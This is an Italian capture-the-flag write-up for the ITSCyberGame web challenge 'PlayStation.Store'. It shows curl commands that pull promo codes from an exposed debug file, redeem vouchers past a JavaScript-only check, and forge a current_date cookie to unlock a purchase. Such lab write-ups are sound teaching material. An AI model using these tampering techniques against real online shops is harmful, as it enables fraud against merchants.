# PlayStation.Store

**Competizione:** ITSCyberGame<br>
**Categoria:** Web<br>
**Connessione:** `sfide.itscybergame.it:<port_number>`

---

## Descrizione

> Voglio giocare a GTA 6!!!!! />:( Se riesci a comprarmi il gioco forse ti do la flag (Nota: il gioco non è incluso con la challenge)

Un fake PlayStation Store con €10 nel wallet. GTA6 costa €89,99 e risulta non disponibile per l'acquisto. Obiettivo: comprare il gioco.

---

## Soluzione

### 1. Ricognizione — robots.txt

Il commento nel sorgente HTML suggerisce:

```html
<!-- TODO rimuovere robots.txt -->
```

```bash
curl -s "http://sfide.itscybergame.it:<port_number>/robots.txt"
```

```
User-agent: *
Disallow: /internal/

# legacy debug file - remove before production
# /internal/promo_state.txt
```

### 2. File debug esposto

```bash
curl -s "http://sfide.itscybergame.it:<port_number>/internal/promo_state.txt"
```

```javascript
window.__PROMO_STATE__ = {
  "WELCOME10": true,
  "PSPROMO23": true,
  "LAUNCH50": true
};
```

Tre codici promo. Leggendo `assets/app.js` si scopre che il controllo "già riscattato" è fatto **solo lato client** in JavaScript, il server non verifica:

```javascript
function attemptRedeem(form){
  const code = input.value.trim().toUpperCase();
  if(isRedeemed(code)){     // controllo solo JS
    alert("Voucher già riscattato");
    return false;
  }
  return true;
}
```

### 3. Bypass del controllo promo — fondi insufficienti

Riscattando tutti e tre i codici via curl (saltando il controllo JS) si porta il wallet a **€460,00**:

```bash
curl -s -c cookies.txt -X POST "http://sfide.itscybergame.it:<port_number>/redeem.php" -d "code=WELCOME10"
curl -s -b cookies.txt -c cookies.txt -X POST "http://sfide.itscybergame.it:<port_number>/redeem.php" -d "code=PSPROMO23"
curl -s -b cookies.txt -c cookies.txt -X POST "http://sfide.itscybergame.it:<port_number>/redeem.php" -d "code=LAUNCH50"
```

### 4. Bypass del controllo data — prodotto non disponibile

Tentando l'acquisto il server risponde: `Transazione rifiutata: prodotto non ancora disponibile`. Il release timestamp del gioco è `1798675200` (anno 2027).

Analizzando `app.js` si vede che il server legge il cookie `current_date` per validare la data:

```javascript
let ct = getCookie("current_date");
// ...
const diff = releaseTs - clientNow;
if(diff <= 0){ /* sblocca acquisto */ }
```

Il server si fida del valore nel cookie senza validarlo. Basta aggiornare il cookie nel jar con un timestamp successivo al rilascio:

```bash
sed -i 's/current_date\t[0-9]*/current_date\t1798675201/' cookies.txt
```

### 5. Acquisto

```bash
curl -s -b cookies.txt "http://sfide.itscybergame.it:<port_number>/buy.php?sku=gta6"
```

Risposta:

```
Acquisto completato con successo.
flag{...}
```

---

## Flag

```
flag{...}
```

---

## Conclusioni

La challenge combina tre vulnerabilità web:

- **File sensibili esposti**: `robots.txt` rivelava `/internal/promo_state.txt` con i codici promo
- **Validazione lato client bypassabile**: il controllo sui voucher già usati era solo in JavaScript, aggirabile con curl diretto
- **Time validation missing**: il server usava il cookie `current_date` fornito dal client per verificare la disponibilità del prodotto, senza mai confrontarlo con l'orologio del server